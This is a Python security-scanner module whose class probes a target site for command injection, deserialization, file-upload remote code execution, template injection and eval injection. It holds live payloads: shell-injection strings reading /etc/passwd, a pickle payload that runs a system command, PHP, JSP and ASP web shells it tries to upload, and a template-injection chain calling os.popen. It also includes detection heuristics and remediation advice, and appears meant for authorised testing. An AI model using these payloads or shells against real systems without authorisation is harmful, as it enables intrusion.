"""
Remote Code Execution (RCE) Testing Module
Comprehensive testing for command injection, deserialization, and file upload vulnerabilities
"""

import logging
import re
import time
import uuid
from datetime import datetime
from typing import Dict, List, Optional
from urllib.parse import urljoin, urlparse

import requests
from bs4 import BeautifulSoup

class RCETester:
    """Remote Code Execution vulnerability testing"""
    
    def __init__(self, config: Dict):
        self.config = config
        self.logger = logging.getLogger(__name__)
        self.session = requests.Session()
        
    def run_test(self, target_url: str, target_domain: str) -> Dict:
        """Run comprehensive RCE testing"""
        self.logger.info(f"Starting RCE testing for {target_url}")
        
        results = {
            'status': 'completed',
            'timestamp': datetime.now().isoformat(),
            'target': target_url,
            'rce_endpoints': [],
            'vulnerabilities': [],
            'recommendations': []
        }
        
        try:
            # Test different RCE vectors
            results['rce_endpoints'] = self._discover_rce_endpoints(target_url)
            self._test_command_injection(target_url, results)
            self._test_deserialization(target_url, results)
            self._test_file_upload_rce(target_url, results)
            self._test_template_injection(target_url, results)
            self._test_eval_injection(target_url, results)
            self._generate_rce_recommendations(results)
            
        except Exception as e:
            results['status'] = 'error'
            results['error'] = str(e)
            self.logger.error(f"Error during RCE testing: {str(e)}")
        
        return results
    
    def _discover_rce_endpoints(self, target_url: str) -> List[Dict]:
        """Discover potential RCE endpoints"""
        rce_endpoints = []
        
        # Common RCE endpoint patterns
        rce_patterns = [
            '/upload', '/file-upload', '/upload-file',
            '/api/upload', '/admin/upload',
            '/eval', '/execute', '/run',
            '/api/eval', '/api/execute',
            '/admin/eval', '/admin/execute',
            '/console', '/shell', '/cmd',
            '/api/console', '/api/shell',
            '/admin/console', '/admin/shell'
        ]
        
        for pattern in rce_patterns:
            try:
                test_url = urljoin(target_url, pattern)
                response = self.session.get(test_url, timeout=10)
                
                if response.status_code in [200, 302, 401, 403]:
                    endpoint_info = {
                        'url': test_url,
                        'status_code': response.status_code,
                        'type': self._classify_rce_endpoint(pattern),
                        'forms': [],
                        'vulnerabilities': []
                    }
                    
                    # Check for forms
                    if response.status_code == 200:
                        soup = BeautifulSoup(response.content, 'html.parser')
                        forms = soup.find_all('form')
                        
                        for form in forms:
                            form_info = self._analyze_rce_form(form, test_url)
                            endpoint_info['forms'].append(form_info)
                    
                    rce_endpoints.append(endpoint_info)
                    
            except Exception as e:
                self.logger.debug(f"Error checking RCE endpoint {pattern}: {str(e)}")
        
        return rce_endpoints
    
    def _classify_rce_endpoint(self, pattern: str) -> str:
        """Classify RCE endpoint type"""
        if any(x in pattern.lower() for x in ['upload', 'file']):
            return 'file_upload'
        elif any(x in pattern.lower() for x in ['eval', 'execute', 'run']):
            return 'code_execution'
        elif any(x in pattern.lower() for x in ['console', 'shell', 'cmd']):
            return 'command_shell'
        else:
            return 'unknown'
    
    def _analyze_rce_form(self, form, base_url: str) -> Dict:
        """Analyze form for RCE potential"""
        form_info = {
            'action': form.get('action', ''),
            'method': form.get('method', 'GET').upper(),
            'enctype': form.get('enctype', ''),
            'inputs': [],
            'vulnerabilities': []
        }
        
        # Analyze inputs
        inputs = form.find_all(['input', 'textarea', 'select'])
        for input_elem in inputs:
            input_info = {
                'name': input_elem.get('name', ''),
                'type': input_elem.get('type', 'text'),
                'accept': input_elem.get('accept', ''),
                'multiple': input_elem.has_attr('multiple')
            }
            form_info['inputs'].append(input_info)
        
        # Check for file upload forms
        file_inputs = [inp for inp in form_info['inputs'] if inp['type'] == 'file']
        if file_inputs:
            form_info['vulnerabilities'].append({
                'type': 'File Upload Form',
                'severity': 'Medium',
                'description': 'Form contains file upload capability',
                'recommendation': 'Validate file types and content'
            })
        
        return form_info
    
    def _discover_actual_endpoints(self, target_url: str) -> List[Dict]:
        """Discover actual endpoints that exist on the target"""
        actual_endpoints = []
        
        # Common endpoint patterns to test
        common_patterns = [
            # Your actual API endpoints
            '/v1/account/auth/logout',
            '/v1/account/auth/me',
            '/v1/account/auth/me',
            # Common patterns that might exist
            '/api/search', '/search', '/api/user', '/user', '/api/file', '/file',
            '/api/logs', '/logs', '/admin/backup', '/backup', '/api/data', '/data',
            '/api/session', '/session', '/api/config', '/config', '/api/cache', '/cache',
            '/api/serialize', '/serialize', '/api/render', '/render', '/api/email', '/email',
            '/api/report', '/report', '/admin/template', '/template', '/api/eval', '/eval',
            '/api/execute', '/execute', '/api/run', '/run', '/admin/eval', '/admin/execute',
            '/api/script', '/script', '/api/code', '/code', '/api/upload', '/upload',
            '/file-upload', '/upload-file', '/api/console', '/console', '/api/shell', '/shell',
            '/api/cmd', '/cmd', '/admin/console', '/admin/shell', '/admin/cmd'
        ]
        
        for pattern in common_patterns:
            try:
                test_url = urljoin(target_url, pattern)
                response = self.session.get(test_url, timeout=10)
                
                if response.status_code == 200:
                    actual_endpoints.append({
                        'url': test_url,
                        'status_code': response.status_code,
                        'content': response.text[:1000],  # First 1000 chars for analysis
                        'forms': []
                    })
                    
            except Exception as e:
                self.logger.debug(f"Error checking endpoint {pattern}: {str(e)}")
        
        return actual_endpoints
    
    def _extract_parameters_from_endpoint(self, endpoint: Dict) -> List[str]:
        """Extract potential parameters from an endpoint"""
        params = []
        
        # Common parameter names
        common_params = ['q', 'query', 'search', 'username', 'user', 'filename', 'file', 
                        'path', 'dir', 'directory', 'id', 'name', 'value', 'data', 'input',
                        'text', 'content', 'message', 'title', 'description', 'url', 'link']
        
        # Try to extract from forms if available
        if 'forms' in endpoint and endpoint['forms']:
            for form in endpoint['forms']:
                for input_elem in form.get('inputs', []):
                    if input_elem.get('name'):
                        params.append(input_elem['name'])
        
        # Add common parameters
        params.extend(common_params)
        
        # Remove duplicates and return
        return list(set(params))
    
    def _test_command_injection(self, target_url: str, results: Dict):
        """Test for command injection vulnerabilities"""
        vulnerabilities = []
        
        # First, discover actual endpoints that exist
        actual_endpoints = self._discover_actual_endpoints(target_url)
        
        # Command injection payloads
        cmd_payloads = [
            '; ls',
            '| ls',
            '&& ls',
            '|| ls',
            '`ls`',
            '$(ls)',
            '; cat /etc/passwd',
            '| cat /etc/passwd',
            '&& cat /etc/passwd',
            '; whoami',
            '| whoami',
            '&& whoami',
            '; id',
            '| id',
            '&& id',
            '; uname -a',
            '| uname -a',
            '&& uname -a'
        ]
        
        # Test only endpoints that actually exist
        for endpoint in actual_endpoints:
            if endpoint['status_code'] == 200:  # Only test endpoints that exist
                # Try to find parameters in forms or common parameter names
                params_to_test = self._extract_parameters_from_endpoint(endpoint)
                
                for param in params_to_test:
                    for payload in cmd_payloads:
                        try:
                            # Test GET parameter
                            response = self.session.get(endpoint['url'], 
                                                      params={param: payload}, 
                                                      timeout=10)
                            
                            if self._detect_command_execution(response):
                                vulnerabilities.append({
                                    'type': 'Command Injection',
                                    'severity': 'Critical',
                                    'description': f'Command injection via {param} parameter at {endpoint["url"]}',
                                    'payload': payload,
                                    'recommendation': 'Use parameterized queries and input validation'
                                })
                                break
                            
                            # Test POST parameter
                            response = self.session.post(endpoint['url'], 
                                                       data={param: payload}, 
                                                       timeout=10)
                            
                            if self._detect_command_execution(response):
                                vulnerabilities.append({
                                    'type': 'Command Injection',
                                    'severity': 'Critical',
                                    'description': f'Command injection via POST {param} parameter at {endpoint["url"]}',
                                    'payload': payload,
                                    'recommendation': 'Use parameterized queries and input validation'
                                })
                                break
                                
                        except Exception as e:
                            self.logger.debug(f"Error testing command injection: {str(e)}")
        
        results['vulnerabilities'].extend(vulnerabilities)
    
    def _test_deserialization(self, target_url: str, results: Dict):
        """Test for deserialization vulnerabilities"""
        vulnerabilities = []
        
        # Test common deserialization endpoints
        deserialization_endpoints = [
            '/api/data',
            '/api/session',
            '/api/config',
            '/admin/config',
            '/api/cache',
            '/api/serialize'
        ]
        
        # Test different serialization formats
        test_payloads = [
            # Java deserialization (base64 encoded)
            'rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABdAAEdGVzdHQABHRlc3R4',
            # PHP deserialization
            'O:8:"stdClass":1:{s:4:"test";s:4:"test";}',
            # Python pickle (base64 encoded)
            'Y3Bvc2l4CnN5c3RlbQpwMQooUydscycKcDIKdHAzClJwNAou',
            # JSON with prototype pollution
            '{"__proto__":{"isAdmin":true}}',
            '{"constructor":{"prototype":{"isAdmin":true}}}'
        ]
        
        for endpoint in deserialization_endpoints:
            test_url = urljoin(target_url, endpoint)
            
            for payload in test_payloads:
                try:
                    # Test JSON
                    response = self.session.post(test_url, 
                                               json={'data': payload}, 
                                               timeout=10)
                    
                    if self._detect_deserialization_vulnerability(response):
                        vulnerabilities.append({
                            'type': 'Deserialization Vulnerability',
                            'severity': 'Critical',
                            'description': f'Deserialization vulnerability at {test_url}',
                            'payload': payload[:100] + '...' if len(payload) > 100 else payload,
                            'recommendation': 'Use safe deserialization methods and validate input'
                        })
                        break
                    
                    # Test form data
                    response = self.session.post(test_url, 
                                               data={'data': payload}, 
                                               timeout=10)
                    
                    if self._detect_deserialization_vulnerability(response):
                        vulnerabilities.append({
                            'type': 'Deserialization Vulnerability',
                            'severity': 'Critical',
                            'description': f'Deserialization vulnerability at {test_url}',
                            'payload': payload[:100] + '...' if len(payload) > 100 else payload,
                            'recommendation': 'Use safe deserialization methods and validate input'
                        })
                        break
                        
                except Exception as e:
                    self.logger.debug(f"Error testing deserialization: {str(e)}")
        
        results['vulnerabilities'].extend(vulnerabilities)
    
    def _test_file_upload_rce(self, target_url: str, results: Dict):
        """Test file upload for RCE vulnerabilities"""
        vulnerabilities = []
        
        # Find file upload endpoints
        upload_endpoints = results.get('rce_endpoints', [])
        file_upload_endpoints = [ep for ep in upload_endpoints if ep['type'] == 'file_upload']
        
        # Malicious file payloads
        malicious_files = {
            'php_shell.php': '<?php system($_GET["cmd"]); ?>',
            'jsp_shell.jsp': '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>',
            'asp_shell.asp': '<% eval request("cmd") %>',
            'python_shell.py': 'import os; os.system("ls")',
            'perl_shell.pl': 'system($ENV{"cmd"});',
            'bash_shell.sh': '#!/bin/bash\nls',
            'cmd_shell.bat': '@echo off\nls'
        }
        
        for endpoint in file_upload_endpoints:
            for form in endpoint['forms']:
                if form['method'] == 'POST':
                    for filename, content in malicious_files.items():
                        try:
                            files = {'file': (filename, content, 'text/plain')}
                            response = self.session.post(endpoint['url'], files=files, timeout=10)
                            
                            if response.status_code == 200:
                                # Try to access the uploaded file
                                uploaded_url = urljoin(endpoint['url'], filename)
                                test_response = self.session.get(uploaded_url, timeout=10)
                                
                                if test_response.status_code == 200 and 'ls' in test_response.text.lower():
                                    vulnerabilities.append({
                                        'type': 'File Upload RCE',
                                        'severity': 'Critical',
                                        'description': f'RCE via file upload at {endpoint["url"]}',
                                        'filename': filename,
                                        'recommendation': 'Validate file types, content, and implement proper file handling'
                                    })
                                    break
                                    
                        except Exception as e:
                            self.logger.debug(f"Error testing file upload RCE: {str(e)}")
        
        results['vulnerabilities'].extend(vulnerabilities)
    
    def _test_template_injection(self, target_url: str, results: Dict):
        """Test for template injection vulnerabilities"""
        vulnerabilities = []
        
        # Template injection payloads
        template_payloads = [
            '{{7*7}}',
            '${7*7}',
            '#{7*7}',
            '<%=7*7%>',
            '{{config}}',
            '${config}',
            '#{config}',
            '<%=config%>',
            '{{self.__init__.__globals__.__builtins__.__import__("os").popen("ls").read()}}',
            '${self.__init__.__globals__.__builtins__.__import__("os").popen("ls").read()}'
        ]
        
        # Test common template injection points
        injection_points = [
            {'url': urljoin(target_url, '/api/render'), 'param': 'template'},
            {'url': urljoin(target_url, '/api/email'), 'param': 'body'},
            {'url': urljoin(target_url, '/api/report'), 'param': 'content'},
            {'url': urljoin(target_url, '/admin/template'), 'param': 'html'}
        ]
        
        for point in injection_points:
            for payload in template_payloads:
                try:
                    response = self.session.post(point['url'], 
                                               data={point['param']: payload}, 
                                               timeout=10)
                    
                    if self._detect_template_injection(response, payload):
                        vulnerabilities.append({
                            'type': 'Template Injection',
                            'severity': 'High',
                            'description': f'Template injection at {point["url"]}',
                            'payload': payload,
                            'recommendation': 'Use safe template engines and validate user input'
                        })
                        break
                        
                except Exception as e:
                    self.logger.debug(f"Error testing template injection: {str(e)}")
        
        results['vulnerabilities'].extend(vulnerabilities)
    
    def _test_eval_injection(self, target_url: str, results: Dict):
        """Test for eval injection vulnerabilities"""
        vulnerabilities = []
        
        # Eval injection payloads
        eval_payloads = [
            'eval("ls")',
            'exec("ls")',
            'system("ls")',
            'shell_exec("ls")',
            'passthru("ls")',
            'popen("ls", "r")',
            'proc_open("ls", [], $pipes)',
            'eval("import os; os.system(\'ls\')")',
            'exec("import os; os.system(\'ls\')")',
            'eval("require(\'child_process\').exec(\'ls\')")'
        ]
        
        # Test common eval endpoints
        eval_endpoints = [
            '/api/eval',
            '/api/execute',
            '/api/run',
            '/admin/eval',
            '/admin/execute',
            '/api/script',
            '/api/code'
        ]
        
        for endpoint in eval_endpoints:
            test_url = urljoin(target_url, endpoint)
            
            for payload in eval_payloads:
                try:
                    response = self.session.post(test_url, 
                                               data={'code': payload}, 
                                               timeout=10)
                    
                    if self._detect_eval_injection(response):
                        vulnerabilities.append({
                            'type': 'Eval Injection',
                            'severity': 'Critical',
                            'description': f'Eval injection at {test_url}',
                            'payload': payload,
                            'recommendation': 'Avoid eval() and similar functions with user input'
                        })
                        break
                        
                except Exception as e:
                    self.logger.debug(f"Error testing eval injection: {str(e)}")
        
        results['vulnerabilities'].extend(vulnerabilities)
    
    def _detect_command_execution(self, response: requests.Response) -> bool:
        """Detect if command execution occurred"""
        # Only consider it a vulnerability if we get a 200 response
        if response.status_code != 200:
            return False
            
        # Look for command output patterns
        command_indicators = [
            'bin', 'usr', 'etc', 'var', 'tmp',
            'root:', 'daemon:', 'bin:', 'sys:',
            'total', 'drwx', '-rw-', '-r--',
            'uid=', 'gid=', 'groups='
        ]
        
        response_text = response.text.lower()
        
        # More strict detection - require multiple indicators
        found_indicators = sum(1 for indicator in command_indicators if indicator in response_text)
        return found_indicators >= 2
    
    def _detect_deserialization_vulnerability(self, response: requests.Response) -> bool:
        """Detect deserialization vulnerability"""
        # Look for deserialization error patterns
        error_patterns = [
            'java.io.objectinputstream',
            'deserialization',
            'unserialize',
            'pickle',
            'prototype pollution',
            'constructor'
        ]
        
        response_text = response.text.lower()
        return any(pattern in response_text for pattern in error_patterns)
    
    def _detect_template_injection(self, response: requests.Response, payload: str) -> bool:
        """Detect template injection"""
        # Only consider it a vulnerability if we get a 200 response
        if response.status_code != 200:
            return False
            
        # Check if mathematical expression was evaluated
        if '7*7' in payload and '49' in response.text:
            return True
        
        # Check for config exposure
        if 'config' in payload.lower() and any(keyword in response.text.lower() for keyword in ['secret', 'key', 'password', 'database']):
            return True
        
        return False
    
    def _detect_eval_injection(self, response: requests.Response) -> bool:
        """Detect eval injection"""
        # Look for command execution indicators
        return self._detect_command_execution(response)
    
    def _generate_rce_recommendations(self, results: Dict):
        """Generate RCE security recommendations"""
        recommendations = []
        
        # Count vulnerabilities by type
        vuln_types = {}
        for vuln in results.get('vulnerabilities', []):
            vuln_type = vuln['type']
            vuln_types[vuln_type] = vuln_types.get(vuln_type, 0) + 1
        
        # Generate specific recommendations
        if vuln_types.get('Command Injection', 0) > 0:
            recommendations.append({
                'priority': 'Critical',
                'recommendation': 'Fix command injection vulnerabilities',
                'details': 'Use parameterized queries and avoid shell execution with user input'
            })
        
        if vuln_types.get('Deserialization Vulnerability', 0) > 0:
            recommendations.append({
                'priority': 'Critical',
                'recommendation': 'Fix deserialization vulnerabilities',
                'details': 'Use safe deserialization methods and validate all input'
            })
        
        if vuln_types.get('File Upload RCE', 0) > 0:
            recommendations.append({
                'priority': 'Critical',
                'recommendation': 'Secure file upload functionality',
                'details': 'Validate file types, scan content, and store files outside web root'
            })
        
        if vuln_types.get('Template Injection', 0) > 0:
            recommendations.append({
                'priority': 'High',
                'recommendation': 'Fix template injection vulnerabilities',
                'details': 'Use safe template engines and sanitize user input'
            })
        
        if vuln_types.get('Eval Injection', 0) > 0:
            recommendations.append({
                'priority': 'Critical',
                'recommendation': 'Remove eval injection vulnerabilities',
                'details': 'Avoid eval() and similar functions with user input'
            })
        
        # General recommendations
        recommendations.extend([
            {
                'priority': 'High',
                'recommendation': 'Implement input validation',
                'details': 'Validate and sanitize all user input'
            },
            {
                'priority': 'High',
                'recommendation': 'Use parameterized queries',
                'details': 'Prevent injection attacks with proper query construction'
            },
            {
                'priority': 'Medium',
                'recommendation': 'Implement file upload restrictions',
                'details': 'Restrict file types, scan content, and use secure storage'
            },
            {
                'priority': 'Medium',
                'recommendation': 'Use safe deserialization',
                'details': 'Avoid deserializing untrusted data'
            },
            {
                'priority': 'Low',
                'recommendation': 'Regular security testing',
                'details': 'Implement automated security testing in CI/CD'
            }
        ])
        
        results['recommendations'].extend(recommendations)